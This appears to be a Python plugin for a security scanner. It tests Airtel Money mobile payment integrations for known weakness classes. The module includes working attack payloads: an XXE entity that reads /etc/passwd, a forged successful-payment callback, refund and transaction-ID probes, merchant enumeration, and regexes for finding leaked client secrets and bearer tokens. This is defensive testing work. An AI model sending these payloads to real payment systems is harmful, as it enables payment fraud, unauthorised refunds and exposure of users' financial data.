"""
airtel_money.py — Airtel Money Provider

Airtel Money is Uganda's second-largest mobile payment platform with ~5M+
active wallets. The Airtel Money API (Africa) has a significantly different
architecture from MTN MoMo — it uses a SOAP-adjacent XML API for legacy
integrations and a more modern REST API (v1/v2) for newer implementations.
Many EA integrations mix both.

API versions supported:
  - Airtel Money API (OpenAPI): openapi.airtel.africa
  - Legacy Airtel Uganda USSD API
  - Africa's Talking Airtel gateway
  - Airtel Commerce (third-party aggregator)

Known vulnerability classes specific to Airtel Money:
  1. Client ID / Client Secret exposure (OAuth2 credentials)
  2. XML/SOAP injection in legacy API integrations
  3. PIN verification bypass in legacy USSD flows
  4. Merchant ID enumeration (sequential integers)
  5. Collection callback without HMAC signature validation
  6. Currency mismatch — UGX vs KES confusion in cross-border integrations
  7. Transaction status polling without auth (GET /transaction/{id})
  8. Refund API accessible without additional confirmation
"""

from __future__ import annotations

import re
from typing import Dict, List

from core.context.mobile_money.base_provider import (
    BaseMobileMoneyProvider,
    MMVulnTest,
    registry,
)


class AirtelMoneyProvider(BaseMobileMoneyProvider):
    """
    Airtel Money vulnerability detection provider.
    Covers the Airtel Africa OpenAPI, legacy XML integrations, and USSD flows.
    """

    # ── Provider identity ──────────────────────────────────────────────────────

    @property
    def name(self) -> str:
        return "Airtel Money"

    @property
    def provider_id(self) -> str:
        return "airtel_money"

    # ── Detection patterns ─────────────────────────────────────────────────────

    @property
    def credential_patterns(self) -> List[re.Pattern]:
        return [
            # Airtel Africa OpenAPI OAuth2 credentials
            re.compile(r"client_id[\s:=\"']+[a-zA-Z0-9_\-]{20,}", re.IGNORECASE),
            re.compile(r"client_secret[\s:=\"']+[a-zA-Z0-9_\-]{20,}", re.IGNORECASE),

            # Airtel-specific credential patterns
            re.compile(r"AIRTEL_CLIENT_ID|AIRTEL_CLIENT_SECRET", re.IGNORECASE),
            re.compile(r"airtel.*api.*key|airtelApiKey|airtel_key", re.IGNORECASE),
            re.compile(r"X-Airtel-Signature[\s:=\"']+", re.IGNORECASE),

            # Legacy Airtel merchant/partner codes
            re.compile(r"merchant_code[\s:=\"']+[A-Z0-9]{6,}", re.IGNORECASE),
            re.compile(r"partner_code[\s:=\"']+[A-Z0-9]{6,}", re.IGNORECASE),
            re.compile(r"AirtelMoneyMerchantCode|airtel.*merchant", re.IGNORECASE),

            # Airtel bearer tokens
            re.compile(r"Bearer [A-Za-z0-9\-_\.]{50,}", re.IGNORECASE),

            # JS variable names seen in EA apps
            re.compile(r"var\s+airtelKey\s*=|const\s+airtelSecret\s*=", re.IGNORECASE),
            re.compile(r"AIRTEL_MONEY_KEY|airtel_money_secret|airtelMoneyKey", re.IGNORECASE),

            # Africa's Talking Airtel variant
            re.compile(r"AT-Airtel|africastalking.*airtel", re.IGNORECASE),
        ]

    @property
    def endpoint_patterns(self) -> List[re.Pattern]:
        return [
            # Official Airtel Africa OpenAPI
            re.compile(r"openapi\.airtel\.africa", re.IGNORECASE),
            re.compile(r"openapi\.airtel\.africa/merchant/v1", re.IGNORECASE),
            re.compile(r"openapi\.airtel\.africa/auth/oauth2/token", re.IGNORECASE),

            # Common integration patterns in EA apps
            re.compile(r"/airtel[-_]?money|/airtelmoney", re.IGNORECASE),
            re.compile(r"/api/airtel|/airtel/pay|/airtel/callback", re.IGNORECASE),
            re.compile(r"/payment/airtel|/checkout/airtel", re.IGNORECASE),
            re.compile(r"/airtel/ipn|/airtel/notify|/airtel/webhook", re.IGNORECASE),

            # Legacy Airtel Uganda (pre-OpenAPI)
            re.compile(r"/airtel/ussd|/ussd/airtel", re.IGNORECASE),
            re.compile(r"airtel.*commerce|airtelcommerce", re.IGNORECASE),
        ]

    # ── Provider-specific vulnerability tests ──────────────────────────────────

    @property
    def provider_tests(self) -> List[MMVulnTest]:
        return [

            # OAuth2 client secret in source
            MMVulnTest(
                test_id="AIRTEL-001",
                name="Airtel OAuth2 Client Secret Exposed",
                description=(
                    "Check for Airtel Money OAuth2 client_id / client_secret "
                    "embedded in JavaScript, HTML, or config files."
                ),
                vuln_class="sensitive_data",
                severity="critical",
                http_method="GET",
                endpoint_pattern=r"\.(js|json|env|config|php|py)$|/static/|/assets/|/config",
                payload="",
                payload_parameter="",
                evidence_pattern=r"client_id.*client_secret|AIRTEL_CLIENT_ID|airtelApiKey",
                provider="airtel_money",
            ),

            # Unauthenticated collection callback
            MMVulnTest(
                test_id="AIRTEL-002",
                name="Airtel Collection Callback Without Signature Validation",
                description=(
                    "POST a fake Airtel payment callback to the IPN endpoint. "
                    "If no HMAC/signature validation, orders can be confirmed "
                    "without real payment."
                ),
                vuln_class="auth_bypass",
                severity="critical",
                http_method="POST",
                endpoint_pattern=r"/airtel/callback|/airtel/ipn|/airtel/notify|/payment.*airtel",
                payload=(
                    '{"transaction":{"id":"FAKE_TXN_001","status":"TS","message":"Airtel Money Transfer Successful",'
                    '"airtel_money_id":"CI240101.0000.000000"},"status":{"code":"200","message":"SUCCESS","result_code":"ESB000010"}}'
                ),
                payload_parameter="body",
                evidence_pattern=r"success|confirmed|processed|order.*updated|200",
                false_positive_check=r"invalid.*signature|signature.*mismatch|unauthorized|401|403",
                provider="airtel_money",
            ),

            # Transaction status IDOR
            MMVulnTest(
                test_id="AIRTEL-003",
                name="Airtel Transaction Status IDOR",
                description=(
                    "Probe transaction status endpoint with a guessed transaction ID. "
                    "If no authentication, any transaction status can be queried."
                ),
                vuln_class="idor",
                severity="high",
                http_method="GET",
                endpoint_pattern=r"/airtel/transaction|/merchant/v1/payments|/transaction.*airtel",
                payload="CI240101.0000.000001",
                payload_parameter="id",
                evidence_pattern=r"amount|msisdn|phone|payer|status.*success",
                false_positive_check=r"not found|404|401|403|invalid",
                provider="airtel_money",
            ),

            # XML injection in legacy Airtel API
            MMVulnTest(
                test_id="AIRTEL-004",
                name="XML Injection in Legacy Airtel SOAP/XML API",
                description=(
                    "Inject XML payloads into legacy Airtel API endpoints that "
                    "accept XML request bodies. Many older EA integrations use XML."
                ),
                vuln_class="xxe",
                severity="high",
                http_method="POST",
                endpoint_pattern=r"/airtel.*api|/api.*airtel|/airtel/soap",
                payload=(
                    '<?xml version="1.0" encoding="UTF-8"?>'
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                    '<request><transaction>&xxe;</transaction></request>'
                ),
                payload_parameter="body",
                evidence_pattern=r"root:|/bin/bash|etc/passwd",
                false_positive_check=r"DOCTYPE not allowed|XXE|external entity",
                provider="airtel_money",
            ),

            # Merchant ID enumeration
            MMVulnTest(
                test_id="AIRTEL-005",
                name="Airtel Merchant ID Enumeration",
                description=(
                    "Enumerate sequential Airtel merchant IDs to discover valid "
                    "merchants and their transaction data."
                ),
                vuln_class="idor",
                severity="medium",
                http_method="GET",
                endpoint_pattern=r"/merchant/|/airtel/merchant",
                payload="10001",
                payload_parameter="merchantId",
                evidence_pattern=r"merchant.*name|business.*name|trade.*name",
                false_positive_check=r"not found|invalid merchant|404",
                provider="airtel_money",
            ),

            # Refund API without additional auth
            MMVulnTest(
                test_id="AIRTEL-006",
                name="Airtel Refund Endpoint Accessible",
                description=(
                    "Check if the Airtel refund/reversal API endpoint is accessible "
                    "from the web without additional manager-level authorisation. "
                    "Should require secondary approval."
                ),
                vuln_class="auth_bypass",
                severity="critical",
                http_method="POST",
                endpoint_pattern=r"/airtel/refund|/refund.*airtel|/reversal.*airtel",
                payload=(
                    '{"transaction":{"airtel_money_id":"CI240101.0000.000001"}}'
                ),
                payload_parameter="body",
                evidence_pattern=r"refund.*initiated|reversal.*success|202|Accepted",
                false_positive_check=r"401|403|unauthorized|additional.*auth",
                provider="airtel_money",
            ),

            # OAuth2 token endpoint without rate limiting
            MMVulnTest(
                test_id="AIRTEL-007",
                name="Airtel OAuth2 Token Endpoint Not Rate-Limited",
                description=(
                    "The /auth/oauth2/token endpoint should be rate-limited "
                    "to prevent brute-force of client credentials."
                ),
                vuln_class="misconfig",
                severity="medium",
                http_method="POST",
                endpoint_pattern=r"/auth/oauth2/token|/airtel/token",
                payload="grant_type=client_credentials&client_id=test&client_secret=test",
                payload_parameter="body",
                evidence_pattern=r"access_token|invalid.*client|401",
                provider="airtel_money",
            ),

            # Currency confusion attack
            MMVulnTest(
                test_id="AIRTEL-008",
                name="Currency Code Manipulation (UGX/KES Confusion)",
                description=(
                    "Submit a payment in KES (Kenyan Shillings) to a UGX endpoint. "
                    "Cross-border integrations sometimes don't validate currency codes, "
                    "resulting in payments processed at wrong exchange rates."
                ),
                vuln_class="misconfig",
                severity="high",
                http_method="POST",
                endpoint_pattern=r"/airtel/pay|/collection|/merchant/v1/payments",
                payload='{"reference":"TEST","subscriber":{"country":"UG","currency":"KES","msisdn":"256700000000"},"transaction":{"amount":"100","country":"UG","currency":"KES","id":"TEST001"}}',
                payload_parameter="body",
                evidence_pattern=r"initiated|pending|reference|transaction_id",
                false_positive_check=r"invalid.*currency|currency.*not supported|UGX.*required",
                provider="airtel_money",
            ),

            # Sandbox key in production
            MMVulnTest(
                test_id="AIRTEL-009",
                name="Airtel Sandbox Credentials in Production",
                description=(
                    "Detect Airtel Money sandbox/staging API keys or endpoint URLs "
                    "being used in a production environment."
                ),
                vuln_class="misconfig",
                severity="high",
                http_method="GET",
                endpoint_pattern=r".*",
                payload="",
                payload_parameter="",
                evidence_pattern=r"openapi\.airtel\.africa.*staging|airtel.*sandbox|AIRTEL.*STAGING",
                provider="airtel_money",
            ),
        ]

    # ── Probe endpoints ────────────────────────────────────────────────────────

    def get_probe_endpoints(self) -> List[Dict[str, str]]:
        return [
            {"path": "/airtel", "method": "GET", "description": "Airtel root"},
            {"path": "/airtel-money", "method": "GET", "description": "Airtel Money"},
            {"path": "/api/airtel", "method": "GET", "description": "Airtel API root"},
            {"path": "/airtel/callback", "method": "GET", "description": "Airtel callback"},
            {"path": "/airtel/ipn", "method": "GET", "description": "Airtel IPN"},
            {"path": "/airtel/transaction", "method": "GET", "description": "Transaction status"},
            {"path": "/merchant/v1/payments", "method": "POST", "description": "Collection API"},
            {"path": "/auth/oauth2/token", "method": "POST", "description": "OAuth2 token"},
        ]

    # ── Finding context ────────────────────────────────────────────────────────

    def build_finding_context(self, test: MMVulnTest, url: str) -> dict:
        ctx = super().build_finding_context(test, url)
        ctx.update({
            "airtel_money_specific": True,
            "api_version": self._detect_api_version(url),
            "affects_wallets": True,
            "data_at_risk": [
                "Airtel Money wallet balances",
                "Transaction histories",
                "MSISDN (phone numbers)",
                "Merchant payment data",
            ],
            "attack_impact": (
                "Exploitation could enable fraudulent transactions, unauthorized "
                "refunds, or financial data exposure affecting Airtel Money users "
                "across Uganda and East Africa."
            ),
            "cross_border_risk": True,   # Airtel operates across multiple EA countries
        })
        return ctx

    @staticmethod
    def _detect_api_version(url: str) -> str:
        if "v1" in url and "v2" not in url:
            return "v1"
        if "v2" in url:
            return "v2"
        return "legacy/unknown"


# ── Airtel Money-specific credential patterns ──────────────────────────────────

AIRTEL_MONEY_SECRET_PATTERNS: List[Dict[str, str]] = [
    {
        "name": "Airtel Money Client Secret",
        "pattern": r"client_secret",
        "context_pattern": r"client_secret[\s:=\"']+[a-zA-Z0-9_\-]{20,}",
        "severity": "critical",
        "description": "Airtel Money OAuth2 client_secret exposed",
    },
    {
        "name": "Airtel Money Client ID",
        "pattern": r"AIRTEL_CLIENT_ID",
        "context_pattern": r"AIRTEL_CLIENT_ID\s*=\s*[a-zA-Z0-9_\-]{10,}",
        "severity": "high",
        "description": "Airtel Money client ID in environment variable dump",
    },
    {
        "name": "Airtel Merchant Code",
        "pattern": r"merchant_code",
        "context_pattern": r"merchant_code[\s:=\"']+[A-Z0-9]{6,}",
        "severity": "high",
        "description": "Airtel Money merchant code exposed",
    },
    {
        "name": "Airtel Bearer Token",
        "pattern": r"Bearer [A-Za-z0-9\-_\.]{50,}",
        "context_pattern": r"Authorization:\s*Bearer [A-Za-z0-9\-_\.]{50,}",
        "severity": "critical",
        "description": "Live Airtel Money OAuth2 Bearer token in response",
    },
]


# ── Register with global registry ─────────────────────────────────────────────
airtel_money_provider = AirtelMoneyProvider()
registry.register(airtel_money_provider)